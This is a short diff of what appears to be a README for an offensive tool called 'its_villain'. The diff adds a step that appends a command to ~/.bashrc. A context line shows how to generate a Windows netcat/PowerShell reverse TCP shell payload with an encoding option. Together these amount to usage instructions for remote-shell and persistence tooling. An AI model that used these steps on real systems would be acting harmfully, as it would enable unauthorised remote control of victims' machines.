@@ -19,6 +19,11 @@ git clone https://github.com/dad1x/its_villain/
 cd its_villain
 chmod +x ja.sh
 
+# add lines to bashrc
+```
+echo "<COMMAND>" >> ~/.bashrc
+```
+
 paste payload WINDOWS EXAMPLE:
 ```
 generate payload=windows/netcat/powershell_reverse_tcp lhost=eth0 encode
